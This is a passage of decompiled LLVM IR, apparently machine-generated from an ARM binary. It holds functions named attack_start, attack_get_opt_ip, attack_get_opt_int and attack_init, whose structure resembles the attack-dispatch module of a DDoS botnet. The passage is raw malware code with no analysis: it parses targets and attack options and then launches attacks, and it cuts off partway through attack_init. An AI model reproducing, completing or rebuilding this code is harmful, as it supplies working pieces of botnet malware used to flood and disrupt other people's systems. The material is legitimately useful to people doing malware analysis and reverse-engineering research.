  %v2_8390 = mul nuw nsw i32 %v4_8380, 5
  store i32 %v2_8390, i32* @r7, align 4
  %v1_8394 = add i32 %arg2, -6
  store i32 %v1_8394, i32* %r3.global-to-local, align 4
  %v3_8398 = icmp ult i32 %v1_8394, %v2_8390
  %v9_8398 = icmp eq i32 %v1_8394, %v2_8390
  store i1 %v9_8398, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_8398, label %dec_label_pc_8340, label %dec_label_pc_83a0

dec_label_pc_83a0:                                ; preds = %dec_label_pc_838c
  store i32 %v4_8380, i32* %r0.global-to-local, align 4
  store i32 24, i32* %r1.global-to-local, align 4
  store i32 %v1_8394, i32* @r6, align 4
  %v2_83ac = call i32 @calloc(i32 %v4_8380, i32 24)
  store i32 %v2_83ac, i32* %ip.global-to-local, align 4
  %v0_83b8 = load i32, i32* @r7, align 4
  %v1_83b8 = load i32, i32* @r4, align 4
  %v2_83b8 = sub i32 %v1_83b8, %v0_83b8
  store i32 %v2_83b8, i32* @r7, align 4
  %v0_83bc = load i32, i32* @r5, align 4
  %v1_83bc = add i32 %v0_83bc, 11
  store i32 %v1_83bc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_83c0

dec_label_pc_83c0:                                ; preds = %dec_label_pc_83c0, %dec_label_pc_83a0
  %v1_83c4 = phi i32 [ %v1_83f0, %dec_label_pc_83c0 ], [ %v2_83ac, %dec_label_pc_83a0 ]
  %v0_83c0 = phi i32 [ %v1_83ec, %dec_label_pc_83c0 ], [ %v1_83bc, %dec_label_pc_83a0 ]
  %v1_83c0 = add i32 %v0_83c0, -5
  %v2_83c0 = inttoptr i32 %v1_83c0 to i32*
  %v3_83c0 = load i32, i32* %v2_83c0, align 4
  store i32 %v3_83c0, i32* %r1.global-to-local, align 4
  %v2_83c4 = add i32 %v1_83c4, 16
  %v3_83c4 = inttoptr i32 %v2_83c4 to i32*
  store i32 %v3_83c0, i32* %v3_83c4, align 4
  %v0_83c8 = load i32, i32* @r7, align 4
  %v1_83c8 = add i32 %v0_83c8, -6
  store i32 %v1_83c8, i32* %r3.global-to-local, align 4
  %v0_83cc = load i32, i32* %r0.global-to-local, align 4
  %v1_83cc = add i32 %v0_83cc, -1
  %v2_83cc = inttoptr i32 %v1_83cc to i8*
  %v3_83cc = load i8, i8* %v2_83cc, align 1
  %v4_83cc = zext i8 %v3_83cc to i32
  store i32 %v4_83cc, i32* %r2.global-to-local, align 4
  %v0_83d0 = load i32, i32* @r6, align 4
  %v1_83d0 = add i32 %v0_83d0, -5
  store i32 %v1_83d0, i32* @r6, align 4
  %v9_83d4 = icmp eq i32 %v1_83d0, %v1_83c8
  store i1 %v9_83d4, i1* %cpsr_z.global-to-local, align 1
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 %v0_83cc, i32* @r4, align 4
  %v2_83e0 = load i32, i32* %ip.global-to-local, align 4
  %v3_83e0 = add i32 %v2_83e0, 20
  %v4_83e0 = inttoptr i32 %v3_83e0 to i8*
  store i8 %v3_83cc, i8* %v4_83e0, align 1
  %v0_83e4 = load i32, i32* %r1.global-to-local, align 4
  %v1_83e4 = load i32, i32* %ip.global-to-local, align 4
  %v2_83e4 = add i32 %v1_83e4, 4
  %v3_83e4 = inttoptr i32 %v2_83e4 to i32*
  store i32 %v0_83e4, i32* %v3_83e4, align 4
  %v0_83e8 = load i32, i32* %r3.global-to-local, align 4
  %v1_83e8 = trunc i32 %v0_83e8 to i16
  %v2_83e8 = load i32, i32* %ip.global-to-local, align 4
  %v3_83e8 = inttoptr i32 %v2_83e8 to i16*
  store i16 %v1_83e8, i16* %v3_83e8, align 2
  %v0_83ec = load i32, i32* %r0.global-to-local, align 4
  %v1_83ec = add i32 %v0_83ec, 5
  store i32 %v1_83ec, i32* %r0.global-to-local, align 4
  %v0_83f0 = load i32, i32* %ip.global-to-local, align 4
  %v1_83f0 = add i32 %v0_83f0, 24
  store i32 %v1_83f0, i32* %ip.global-to-local, align 4
  %v0_83f4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_83f4, label %dec_label_pc_83f8, label %dec_label_pc_83c0

dec_label_pc_83f8:                                ; preds = %dec_label_pc_83c0
  %v0_83f8 = load i32, i32* @r6, align 4
  %v2_83f8 = icmp eq i32 %v0_83f8, 0
  store i1 %v2_83f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_83f8, label %dec_label_pc_84fc, label %dec_label_pc_8400

dec_label_pc_8400:                                ; preds = %dec_label_pc_83f8
  %v0_8400 = load i32, i32* @r4, align 4
  %v1_8400 = inttoptr i32 %v0_8400 to i8*
  %v2_8400 = load i8, i8* %v1_8400, align 1
  %v3_8400 = zext i8 %v2_8400 to i32
  store i32 %v3_8400, i32* @r5, align 4
  %v2_8404 = icmp eq i8 %v2_8400, 0
  store i1 %v2_8404, i1* %cpsr_z.global-to-local, align 1
  %v0_8408 = load i32, i32* @r7, align 4
  %v1_8408 = add i32 %v0_8408, -7
  store i32 %v1_8408, i32* @r8, align 4
  br i1 %v2_8404, label %bb, label %dec_label_pc_8414

bb:                                               ; preds = %dec_label_pc_8400
  store i32 %v3_8400, i32* @r6, align 4
  br label %dec_label_pc_84d8

dec_label_pc_8414:                                ; preds = %dec_label_pc_8400
  store i32 %v3_8400, i32* %r0.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v2_841c = call i32 @calloc(i32 %v3_8400, i32 8)
  store i32 %v2_841c, i32* %r0.global-to-local, align 4
  %v0_8420 = load i32, i32* @r8, align 4
  %v2_8420 = icmp eq i32 %v0_8420, 0
  store i1 %v2_8420, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_841c, i32* @r6, align 4
  br i1 %v2_8420, label %dec_label_pc_84fc, label %dec_label_pc_842c

dec_label_pc_842c:                                ; preds = %dec_label_pc_8414
  %v0_842c = load i32, i32* @r4, align 4
  %v1_842c = add i32 %v0_842c, 1
  %v2_842c = inttoptr i32 %v1_842c to i8*
  %v3_842c = load i8, i8* %v2_842c, align 1
  %v0_8430 = load i32, i32* @r7, align 4
  %v7_8430 = icmp eq i32 %v0_8430, 8
  store i1 %v7_8430, i1* %cpsr_z.global-to-local, align 1
  %v3_8434 = add i32 %v2_841c, 4
  %v4_8434 = inttoptr i32 %v3_8434 to i8*
  store i8 %v3_842c, i8* %v4_8434, align 1
  %v0_8438 = load i32, i32* @r4, align 4
  %v1_8438 = add i32 %v0_8438, 1
  store i32 %v1_8438, i32* %r3.global-to-local, align 4
  %v0_843c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_843c, label %dec_label_pc_84fc, label %dec_label_pc_8440

dec_label_pc_8440:                                ; preds = %dec_label_pc_842c
  %v1_8440 = add i32 %v0_8438, 2
  %v2_8440 = inttoptr i32 %v1_8440 to i8*
  %v3_8440 = load i8, i8* %v2_8440, align 1
  %v4_8440 = zext i8 %v3_8440 to i32
  store i32 %v4_8440, i32* @r4, align 4
  %v0_8444 = load i32, i32* @r7, align 4
  %v1_8444 = add i32 %v0_8444, -9
  store i32 %v1_8444, i32* @r8, align 4
  %v9_8448 = icmp eq i32 %v1_8444, %v4_8440
  store i1 %v9_8448, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_8440, i32* %r1.global-to-local, align 4
  %v5_8450 = icmp slt i32 %v1_8444, %v4_8440
  br i1 %v5_8450, label %dec_label_pc_84fc, label %bb35

bb35:                                             ; preds = %dec_label_pc_8440
  store i32 0, i32* %r2.global-to-local, align 4
  %v7_84547 = add i32 %v0_8438, 3
  store i32 %v7_84547, i32* @r7, align 4
  %v6_8458 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v6_8458, i32* @sl, align 4
  br label %dec_label_pc_849c

dec_label_pc_8468:                                ; preds = %dec_label_pc_849c
  %v0_8468 = load i32, i32* @r8, align 4
  %v1_8468 = load i32, i32* @r4, align 4
  %v2_8468 = sub i32 %v0_8468, %v1_8468
  store i32 %v2_8468, i32* %r2.global-to-local, align 4
  %v9_8468 = icmp eq i32 %v0_8468, %v1_8468
  store i1 %v9_8468, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_8468, label %dec_label_pc_84fc, label %dec_label_pc_8470

dec_label_pc_8470:                                ; preds = %dec_label_pc_8468
  %v1_8470 = load i32, i32* @r7, align 4
  %v2_8470 = add i32 %v1_8470, %v1_8468
  %v3_8470 = inttoptr i32 %v2_8470 to i8*
  %v4_8470 = load i8, i8* %v3_8470, align 1
  store i32 %v2_8470, i32* %r0.global-to-local, align 4
  %v1_8478 = add i32 %v2_8468, -1
  store i32 %v1_8478, i32* %r2.global-to-local, align 4
  %v7_8478 = icmp eq i32 %v2_8468, 1
  store i1 %v7_8478, i1* %cpsr_z.global-to-local, align 1
  %v3_847c = add i32 %v2_84d0, 4
  %v4_847c = inttoptr i32 %v3_847c to i8*
  store i8 %v4_8470, i8* %v4_847c, align 1
  %v0_8480 = load i32, i32* %r0.global-to-local, align 4
  %v1_8480 = add i32 %v0_8480, 1
  store i32 %v1_8480, i32* %r3.global-to-local, align 4
  %v0_8484 = load i32, i32* %r2.global-to-local, align 4
  %v1_8484 = add i32 %v0_8484, -1
  store i32 %v1_8484, i32* @r8, align 4
  %v1_8488 = add i32 %v0_8480, 2
  store i32 %v1_8488, i32* @r7, align 4
  %v0_848c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_848c, label %dec_label_pc_84fc, label %dec_label_pc_8490

dec_label_pc_8490:                                ; preds = %dec_label_pc_8470
  %v2_8490 = inttoptr i32 %v1_8480 to i8*
  %v3_8490 = load i8, i8* %v2_8490, align 1
  %v4_8490 = zext i8 %v3_8490 to i32
  store i32 %v4_8490, i32* @r4, align 4
  %v2_8494 = sub i32 %v1_8484, %v4_8490
  %tmp36 = sub i32 0, %v2_8494
  %v6_8494 = and i32 %v1_8484, %tmp36
  %v7_8494 = icmp slt i32 %v6_8494, 0
  %v8_8494 = icmp slt i32 %v2_8494, 0
  %v9_8494 = icmp eq i32 %v1_8484, %v4_8490
  store i1 %v9_8494, i1* %cpsr_z.global-to-local, align 1
  %v2_8498 = xor i1 %v8_8494, %v7_8494
  br i1 %v2_8498, label %dec_label_pc_84fc, label %dec_label_pc_849c

dec_label_pc_849c:                                ; preds = %bb35, %dec_label_pc_8490
  %v0_84a0 = phi i32 [ %v4_8440, %bb35 ], [ %v4_8490, %dec_label_pc_8490 ]
  %stack_var_-48.1 = phi i32 [ 0, %bb35 ], [ %v1_84b0, %dec_label_pc_8490 ]
  store i32 1, i32* %r1.global-to-local, align 4
  %v1_84a0 = add nuw nsw i32 %v0_84a0, 1
  store i32 %v1_84a0, i32* %r0.global-to-local, align 4
  %v2_84a4 = call i32 @calloc(i32 %v1_84a0, i32 1)
  store i32 %v2_84a4, i32* %r0.global-to-local, align 4
  store i32 %stack_var_-48.1, i32* %r3.global-to-local, align 4
  %v1_84ac = load i32, i32* @sl, align 4
  %v2_84ac = inttoptr i32 %v1_84ac to i32*
  store i32 %v2_84a4, i32* %v2_84ac, align 4
  %v0_84b0 = load i32, i32* %r3.global-to-local, align 4
  %v1_84b0 = add i32 %v0_84b0, 1
  store i32 %v1_84b0, i32* %r3.global-to-local, align 4
  %v0_84b4 = load i32, i32* @r4, align 4
  store i32 %v0_84b4, i32* %r2.global-to-local, align 4
  %v0_84b8 = load i32, i32* @r7, align 4
  store i32 %v0_84b8, i32* %r1.global-to-local, align 4
  %v3_84c0 = call i32 @util_memcpy(i32 %v2_84a4, i32 %v0_84b8, i32 %v0_84b4)
  store i32 %v3_84c0, i32* %r0.global-to-local, align 4
  store i32 %v1_84b0, i32* %r2.global-to-local, align 4
  %v3_84c8 = mul i32 %v1_84b0, 8
  store i32 %v3_84c8, i32* %r3.global-to-local, align 4
  %v1_84cc = load i32, i32* @r5, align 4
  %v9_84cc = icmp eq i32 %v1_84b0, %v1_84cc
  store i1 %v9_84cc, i1* %cpsr_z.global-to-local, align 1
  %v0_84d0 = load i32, i32* @r6, align 4
  %v2_84d0 = add i32 %v0_84d0, %v3_84c8
  store i32 %v2_84d0, i32* @sl, align 4
  br i1 %v9_84cc, label %dec_label_pc_84d8, label %dec_label_pc_8468

dec_label_pc_84d8:                                ; preds = %dec_label_pc_849c, %bb
  %v0_84d8 = call i32 @__GI___errno_location()
  %v2_84e0 = inttoptr i32 %v0_84d8 to i32*
  store i32 0, i32* %v2_84e0, align 4
  store i32 %v4_8370, i32* %r1.global-to-local, align 4
  %v0_84e8 = load i32, i32* @fp, align 4
  store i32 %v0_84e8, i32* %r0.global-to-local, align 4
  %v0_84ec = load i32, i32* @sb, align 4
  store i32 %v0_84ec, i32* %r2.global-to-local, align 4
  store i32 %v2_83ac, i32* %r3.global-to-local, align 4
  %v2_84f4 = load i32, i32* @r5, align 4
  %v5_84f4 = load i32, i32* @r6, align 4
  %v6_84f8 = trunc i32 %v2_84f4 to i8
  %v7_84f8 = call i32 @attack_start(i32 %v0_84e8, i32 %v4_8370, i32 %v0_84ec, i32 %v2_83ac, i8 %v6_84f8, i32 %v5_84f4)
  store i32 %v7_84f8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_84fc

dec_label_pc_84fc:                                ; preds = %dec_label_pc_8490, %dec_label_pc_8470, %dec_label_pc_8468, %dec_label_pc_8440, %dec_label_pc_842c, %dec_label_pc_8414, %dec_label_pc_83f8, %dec_label_pc_84d8
  store i32 %v2_83ac, i32* %r3.global-to-local, align 4
  %v2_8500 = icmp eq i32 %v2_83ac, 0
  store i1 %v2_8500, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8500, label %bb38, label %bb37

bb37:                                             ; preds = %dec_label_pc_84fc
  store i32 %v2_83ac, i32* %r0.global-to-local, align 4
  br label %bb38

bb38:                                             ; preds = %dec_label_pc_84fc, %bb37
  store i32 34060, i32* @lr, align 4
  %v1_8508 = xor i1 %v2_8500, true
  call void @__pseudo_cond_branch(i1 %v1_8508, i32 ptrtoint (i32* @global_var_1358c.34 to i32))
  %v0_850c = load i32, i32* @r6, align 4
  %v2_850c = icmp eq i32 %v0_850c, 0
  store i1 %v2_850c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_850c, label %.dec_label_pc_8340_crit_edge, label %dec_label_pc_8514

.dec_label_pc_8340_crit_edge:                     ; preds = %bb38
  %v1_8348.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8340

dec_label_pc_8514:                                ; preds = %bb38
  %v0_8514 = load i32, i32* @r5, align 4
  %v2_8514 = icmp eq i32 %v0_8514, 0
  store i1 %v2_8514, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8514, label %dec_label_pc_8538, label %dec_label_pc_851c

dec_label_pc_851c:                                ; preds = %dec_label_pc_8514
  br label %dec_label_pc_8520

dec_label_pc_8520:                                ; preds = %dec_label_pc_8520, %dec_label_pc_851c
  %v0_8528 = phi i32 [ 0, %dec_label_pc_851c ], [ %v1_8530, %dec_label_pc_8520 ]
  %v0_8520 = phi i32 [ %v0_850c, %dec_label_pc_851c ], [ %v0_8538.pre, %dec_label_pc_8520 ]
  %v4_8520 = mul i32 %v0_8528, 8
  %v5_8520 = add i32 %v4_8520, %v0_8520
  %v6_8520 = inttoptr i32 %v5_8520 to i32*
  %v7_8520 = load i32, i32* %v6_8520, align 4
  store i32 %v7_8520, i32* %r0.global-to-local, align 4
  %v2_8524 = icmp eq i32 %v7_8520, 0
  store i1 %v2_8524, i1* %cpsr_z.global-to-local, align 1
  %v1_8528 = add i32 %v0_8528, 1
  store i32 %v1_8528, i32* @r4, align 4
  store i32 34096, i32* @lr, align 4
  %v1_852c = xor i1 %v2_8524, true
  call void @__pseudo_cond_branch(i1 %v1_852c, i32 ptrtoint (i32* @global_var_1358c.34 to i32))
  %v0_8530 = load i32, i32* @r5, align 4
  %v1_8530 = load i32, i32* @r4, align 4
  %v9_8530 = icmp eq i32 %v0_8530, %v1_8530
  store i1 %v9_8530, i1* %cpsr_z.global-to-local, align 1
  %v0_8538.pre = load i32, i32* @r6, align 4
  br i1 %v9_8530, label %dec_label_pc_8538, label %dec_label_pc_8520

dec_label_pc_8538:                                ; preds = %dec_label_pc_8520, %dec_label_pc_8514
  %v0_8538 = phi i32 [ %v0_850c, %dec_label_pc_8514 ], [ %v0_8538.pre, %dec_label_pc_8520 ]
  store i32 %v0_8538, i32* @r0, align 4
  %v0_853c = call i32 @free()
  store i32 %v0_853c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8340

; uselistorder directives
  uselistorder i32 %v0_853c, { 1, 0 }
  uselistorder i32 %v1_8530, { 1, 0 }
  uselistorder i1 %v2_8500, { 0, 2, 1 }
  uselistorder i32 %v2_84d0, { 1, 0 }
  uselistorder i32 %v3_84c8, { 1, 0 }
  uselistorder i32 %v1_84b0, { 3, 0, 2, 4, 1 }
  uselistorder i32 %v2_8494, { 1, 0 }
  uselistorder i32 %v4_8490, { 0, 2, 1, 3 }
  uselistorder i32 %v1_8484, { 2, 0, 1, 3 }
  uselistorder i32 %v3_8400, { 1, 0, 2, 3 }
  uselistorder i32 %v1_83f0, { 1, 0 }
  uselistorder i32 %v1_83ec, { 1, 0 }
  uselistorder i32 %v2_83ac, { 0, 4, 5, 2, 3, 1, 6 }
  uselistorder i32 %v4_8380, { 1, 0, 2, 3 }
  uselistorder i32 %v1_8350, { 0, 5, 4, 3, 2, 1 }
  uselistorder i32 %v2_834c, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v0_8338, { 1, 2, 3, 0, 4 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 3, 4, 5, 6, 2, 7, 8, 9, 10, 11, 12 }
  uselistorder i32* %r2.global-to-local, { 1, 5, 6, 2, 3, 4, 0, 7, 8, 9 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0 }
  uselistorder i32* %r0.global-to-local, { 4, 2, 17, 3, 6, 5, 9, 11, 10, 7, 8, 18, 19, 12, 13, 14, 15, 16, 20, 21, 0, 1 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 9, 5, 6, 7, 8, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22 }
  uselistorder label %bb38, { 1, 0 }
  uselistorder label %dec_label_pc_84fc, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_849c, { 1, 0 }
  uselistorder label %dec_label_pc_8340, { 6, 1, 0, 2, 3, 4, 5 }
}

define i32 @attack_get_opt_ip(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v2_8544 = icmp eq i32 %arg1, 0
  %v3_8548 = load i32, i32* @r4, align 4
  store i32 %v3_8548, i32* %stack_var_-8, align 4
  %v6_8548 = load i32, i32* @lr, align 4
  store i32 %arg4, i32* @r4, align 4
  br i1 %v2_8544, label %dec_label_pc_858c, label %dec_label_pc_8554

dec_label_pc_8554:                                ; preds = %entry
  %v0_8554 = load i32, i32* %r1.global-to-local, align 4
  %v1_8554 = add i32 %v0_8554, 4
  %v2_8554 = inttoptr i32 %v1_8554 to i8*
  %v3_8554 = load i8, i8* %v2_8554, align 1
  %v4_8554 = zext i8 %v3_8554 to i32
  %v9_8558 = icmp eq i32 %v4_8554, %arg3
  br i1 %v9_8558, label %dec_label_pc_8598, label %dec_label_pc_857c.preheader

dec_label_pc_857c.preheader:                      ; preds = %dec_label_pc_8554
  br label %dec_label_pc_857c

dec_label_pc_856c:                                ; preds = %dec_label_pc_857c
  %v1_856c = add i32 %v0_8574.in, 12
  %v2_856c = inttoptr i32 %v1_856c to i8*
  %v3_856c = load i8, i8* %v2_856c, align 1
  %v4_856c = zext i8 %v3_856c to i32
  %v9_8570 = icmp eq i32 %v4_856c, %arg3
  br i1 %v9_8570, label %dec_label_pc_8598, label %dec_label_pc_857c

dec_label_pc_857c:                                ; preds = %dec_label_pc_857c.preheader, %dec_label_pc_856c
  %v0_8574.in = phi i32 [ %v0_8554, %dec_label_pc_857c.preheader ], [ %v0_8574, %dec_label_pc_856c ]
  %v0_857c = phi i32 [ 0, %dec_label_pc_857c.preheader ], [ %v1_857c, %dec_label_pc_856c ]
  %v0_8574 = add i32 %v0_8574.in, 8
  %v1_857c = add i32 %v0_857c, 1
  %v9_8580 = icmp eq i32 %v1_857c, %arg1
  store i32 %v0_8574, i32* %r1.global-to-local, align 4
  br i1 %v9_8580, label %dec_label_pc_858c, label %dec_label_pc_856c

dec_label_pc_858c:                                ; preds = %dec_label_pc_857c, %dec_label_pc_8598, %entry, %dec_label_pc_85a4
  %v2_8590 = phi i32 [ %v3_8548, %dec_label_pc_8598 ], [ %v3_8548, %entry ], [ %v2_8590.pre, %dec_label_pc_85a4 ], [ %v3_8548, %dec_label_pc_857c ]
  %v0_858c = phi i32 [ %arg4, %dec_label_pc_8598 ], [ %arg4, %entry ], [ %v1_85a4, %dec_label_pc_85a4 ], [ %arg4, %dec_label_pc_857c ]
  store i32 %v2_8590, i32* @r4, align 4
  store i32 %v6_8548, i32* @lr, align 4
  ret i32 %v0_858c

dec_label_pc_8598:                                ; preds = %dec_label_pc_856c, %dec_label_pc_8554
  %v0_8598 = phi i32 [ %v0_8554, %dec_label_pc_8554 ], [ %v0_8574, %dec_label_pc_856c ]
  %v1_8598 = inttoptr i32 %v0_8598 to i32*
  %v2_8598 = load i32, i32* %v1_8598, align 4
  store i32 %v2_8598, i32* @r0, align 4
  %v2_859c = icmp eq i32 %v2_8598, 0
  br i1 %v2_859c, label %dec_label_pc_858c, label %dec_label_pc_85a4

dec_label_pc_85a4:                                ; preds = %dec_label_pc_8598
  %v1_85a4 = call i32 @inet_addr(i32 %v2_8598)
  %v2_8590.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_858c

; uselistorder directives
  uselistorder i32 %v1_857c, { 1, 0 }
  uselistorder i32 %v0_8574, { 1, 0, 2 }
  uselistorder i32 %v0_8574.in, { 1, 0 }
  uselistorder i32 %v0_8554, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_858c, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_857c, { 1, 0 }
}

define i32 @attack_get_opt_int(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v2_85b0 = icmp eq i32 %arg1, 0
  %v3_85b4 = load i32, i32* @r4, align 4
  store i32 %v3_85b4, i32* %stack_var_-8, align 4
  %v6_85b4 = load i32, i32* @lr, align 4
  br i1 %v2_85b0, label %dec_label_pc_85f8, label %dec_label_pc_85c0

dec_label_pc_85c0:                                ; preds = %entry
  %v0_85c0 = load i32, i32* %r1.global-to-local, align 4
  %v1_85c0 = add i32 %v0_85c0, 4
  %v2_85c0 = inttoptr i32 %v1_85c0 to i8*
  %v3_85c0 = load i8, i8* %v2_85c0, align 1
  %v4_85c0 = zext i8 %v3_85c0 to i32
  %v9_85c4 = icmp eq i32 %v4_85c0, %arg3
  br i1 %v9_85c4, label %dec_label_pc_8604, label %dec_label_pc_85e8.preheader

dec_label_pc_85e8.preheader:                      ; preds = %dec_label_pc_85c0
  br label %dec_label_pc_85e8

dec_label_pc_85d8:                                ; preds = %dec_label_pc_85e8
  %v1_85d8 = add i32 %v0_85e0.in, 12
  %v2_85d8 = inttoptr i32 %v1_85d8 to i8*
  %v3_85d8 = load i8, i8* %v2_85d8, align 1
  %v4_85d8 = zext i8 %v3_85d8 to i32
  %v9_85dc = icmp eq i32 %v4_85d8, %arg3
  br i1 %v9_85dc, label %dec_label_pc_8604, label %dec_label_pc_85e8

dec_label_pc_85e8:                                ; preds = %dec_label_pc_85e8.preheader, %dec_label_pc_85d8
  %v0_85e0.in = phi i32 [ %v0_85c0, %dec_label_pc_85e8.preheader ], [ %v0_85e0, %dec_label_pc_85d8 ]
  %v0_85e8 = phi i32 [ 0, %dec_label_pc_85e8.preheader ], [ %v1_85e8, %dec_label_pc_85d8 ]
  %v0_85e0 = add i32 %v0_85e0.in, 8
  %v1_85e8 = add i32 %v0_85e8, 1
  %v9_85ec = icmp eq i32 %v1_85e8, %arg1
  store i32 %v0_85e0, i32* %r1.global-to-local, align 4
  br i1 %v9_85ec, label %dec_label_pc_85f8, label %dec_label_pc_85d8

dec_label_pc_85f8:                                ; preds = %dec_label_pc_85e8, %dec_label_pc_8604, %entry, %dec_label_pc_8610
  %v2_85fc = phi i32 [ %v3_85b4, %dec_label_pc_8604 ], [ %v3_85b4, %entry ], [ %v2_85fc.pre, %dec_label_pc_8610 ], [ %v3_85b4, %dec_label_pc_85e8 ]
  %v0_85f8 = phi i32 [ %arg4, %dec_label_pc_8604 ], [ %arg4, %entry ], [ %v3_8614, %dec_label_pc_8610 ], [ %arg4, %dec_label_pc_85e8 ]
  store i32 %v2_85fc, i32* @r4, align 4
  store i32 %v6_85b4, i32* @lr, align 4
  ret i32 %v0_85f8

dec_label_pc_8604:                                ; preds = %dec_label_pc_85d8, %dec_label_pc_85c0
  %v0_8604 = phi i32 [ %v0_85c0, %dec_label_pc_85c0 ], [ %v0_85e0, %dec_label_pc_85d8 ]
  %v1_8604 = inttoptr i32 %v0_8604 to i32*
  %v2_8604 = load i32, i32* %v1_8604, align 4
  %v2_8608 = icmp eq i32 %v2_8604, 0
  br i1 %v2_8608, label %dec_label_pc_85f8, label %dec_label_pc_8610

dec_label_pc_8610:                                ; preds = %dec_label_pc_8604
  store i32 10, i32* %r1.global-to-local, align 4
  %v2_8614 = inttoptr i32 %v2_8604 to i8*
  %v3_8614 = call i32 @util_atoi(i8* %v2_8614, i32 10)
  %v2_85fc.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_85f8

; uselistorder directives
  uselistorder i32 %v1_85e8, { 1, 0 }
  uselistorder i32 %v0_85e0, { 1, 0, 2 }
  uselistorder i32 %v0_85e0.in, { 1, 0 }
  uselistorder i32 %v0_85c0, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_85f8, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_85e8, { 1, 0 }
}

define i32 @attack_init(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_8620 = load i32, i32* @r4, align 4
  store i32 %v3_8620, i32* %stack_var_-24, align 4
  %v6_8620 = load i32, i32* @r5, align 4
  %v9_8620 = load i32, i32* @r6, align 4
  %v12_8620 = load i32, i32* @r7, align 4
  %v15_8620 = load i32, i32* @r8, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v2_862c = call i32 @calloc(i32 1, i32 8)
  store i32 ptrtoint (i8** @global_var_22420.29 to i32), i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_22424.31 to i32), i32* @r6, align 4
  store i32 47272, i32* %r2.global-to-local, align 4
  store i32 %v2_862c, i32* @r5, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_22421.38 to i32), i32* %r1.global-to-local, align 4
  %v2_864c = load i32, i32* @global_var_22424.31, align 4
  %v2_8650 = inttoptr i32 %v2_862c to i32*
  store i32 47272, i32* %v2_8650, align 4
  %v3_8654 = load i32, i32* @r5, align 4
  %v4_8654 = add i32 %v3_8654, 4
  %v5_8654 = inttoptr i32 %v4_8654 to i8*
  store i8 0, i8* %v5_8654, align 1
  %v0_8658 = load i32, i32* %r1.global-to-local, align 4
  %v3_8658 = mul i32 %v0_8658, 4
  store i32 %v3_8658, i32* %r1.global-to-local, align 4
  %v5_865c = inttoptr i32 %v2_864c to i32*
  %v6_865c = call i32 @realloc(i32* %v5_865c, i32 %v3_8658, i32 47272, i32 0)
  %v2_8660 = load i8, i8* bitcast (i8** @global_var_22420.29 to i8*), align 4
  %v3_8660 = zext i8 %v2_8660 to i32
  store i32 %v6_865c, i32* %r2.global-to-local, align 4
  %v0_8668 = load i32, i32* @r5, align 4
  %v5_8668 = mul nuw nsw i32 %v3_8660, 4
  %v6_8668 = add i32 %v5_8668, %v6_865c
  %v7_8668 = inttoptr i32 %v6_8668 to i32*
  store i32 %v0_8668, i32* %v7_8668, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_22421.38 to i32), i32* %r3.global-to-local, align 4
  %v1_8678 = load i32, i32* @r6, align 4
  %v2_8678 = inttoptr i32 %v1_8678 to i32*
  store i32 %v6_865c, i32* %v2_8678, align 4
  %v0_867c = load i32, i32* %r3.global-to-local, align 4
  %v1_867c = trunc i32 %v0_867c to i8
  %v2_867c = load i32, i32* @r4, align 4
  %v3_867c = inttoptr i32 %v2_867c to i8*
  store i8 %v1_867c, i8* %v3_867c, align 1
  %v2_8680 = call i32 @calloc(i32 1, i32 8)
  store i32 ptrtoint (i32* @global_var_bd94.40 to i32), i32* %r3.global-to-local, align 4
  store i32 1, i32* @r8, align 4
  store i32 %v2_8680, i32* @r5, align 4
  store i32 ptrtoint (i8* @global_var_22421.38 to i32), i32* %r1.global-to-local, align 4
  %v2_8698 = load i32, i32* @global_var_22424.31, align 4
  %v2_869c = inttoptr i32 %v2_8680 to i32*
